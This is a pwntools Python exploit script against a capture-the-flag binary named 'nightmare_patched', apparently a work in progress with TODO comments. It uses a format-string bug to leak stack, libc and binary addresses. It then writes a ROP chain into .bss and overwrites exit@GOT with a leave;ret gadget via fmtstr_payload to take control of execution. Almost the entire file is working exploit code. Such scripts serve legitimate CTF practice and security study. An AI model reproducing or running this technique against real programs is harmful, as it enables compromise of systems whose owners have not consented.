#!/usr/bin/env python3

from pwn import *

e = ELF("./nightmare_patched")
# libc = ELF('./libc.so.6')
# rop = ROP(e)

context.binary = e
context.terminal = ['tmux', 'split', '-h']
# context.log_level = 'debug'


def conn():
    if args.LOCAL:
        # Use PTY (Pseudo terminal) to avoid some stdin/out buffer issue, e.g. HTB Jeeves
        r = process([e.path], stdin=process.PTY, stdout=process.PTY)
    elif args.GDB:
        r = gdb.debug([e.path], '''
                      set breakpoint pending on
                      b __libc_start_call_main
                      command 1
                        # fprintf() in scream()
                        set $a = $rdi - 0x14f + 0x63
                        b *$a
                        # exit() in escape()
                        set $a = $rdi - 0xa0 + 0x94
                        b *$a
                        c
                      end
                      c
                      ''', stdin=process.PTY, stdout=process.PTY)
    elif args.GDB_ATTACH:
        r = process([e.path], stdin=process.PTY, stdout=process.PTY)
        gdb.attach(r, gdbscript='''
                      b *(main)
                      c
                   ''')
    elif args.REMOTE:
        ip, port = args.REMOTE.split(':')
        r = remote(ip, port)
    else:
        error('unknown running mode for the script')

    return r


def main():
    r = conn()

    # Attempt using stack pivot
    # Failed because I cannot find a way to change RSP.

    r.sendlineafter(b'>', b'1')
    r.sendlineafter(b'>>', b'%1$p%12$p%42$p')
    data = r.recvline()[:-1].split(b'0x')
    # info(f'data is {data}')
    # Offsets are found via ghidra or GDB.
    stack_addr = int(data[1], 16)
    libc_addr = int(data[2], 16) - 0x337eb  # TODO: this offset needs to be updated
    e.address = int(data[3], 16) - 0x14c9
    main_addr = e.address + 0x1478
    leave_ret_addr = e.address + 0x1476
    info(f'stack address is {hex(stack_addr)}')
    info(f'libc address is {hex(libc_addr)}')
    info(f'binary address is {hex(e.address)}')
    info(f'main() address is {hex(main_addr)}')

    OFFSET = 5  # Found manually via following payload
    # r.sendlineafter(b'>>', b'AAAAAAAA%p%p%p%p%p')
    # ret_addr_loc = stack_addr + 0x148   # Found via debugging. Note this is the return address location of the main().
    # TODO: rename this if .bss works.
    ret_addr_loc = e.bss() + 0x100
    info(f'ret address is on stack {hex(ret_addr_loc)}')
    pop_rdi_ret_addr = next(e.search(asm('pop rdi; ret'), executable=True))
    writes = [
            (ret_addr_loc, pop_rdi_ret_addr),
            (ret_addr_loc + 8, e.got.puts),
            (ret_addr_loc + 16, e.plt.puts),
            (ret_addr_loc + 24, main_addr),
            (e.got.exit, leave_ret_addr),
              ]
    for addr, value in writes:
        r.sendlineafter(b'>', b'1')
        payload = fmtstr_payload(offset=OFFSET, writes={
            addr: value,
            })
        info(f'payload size is {len(payload)}')
        r.sendlineafter(b'>>', payload)

    r.sendlineafter(b'>', b'2')
    r.sendlineafter(b'>>', b'lulzk')
    data = r.recvline()
    info(f'data is {data}')
    data = r.recvline()
    info(f'data is {data}')

    r.interactive()

if __name__ == "__main__":
    main()
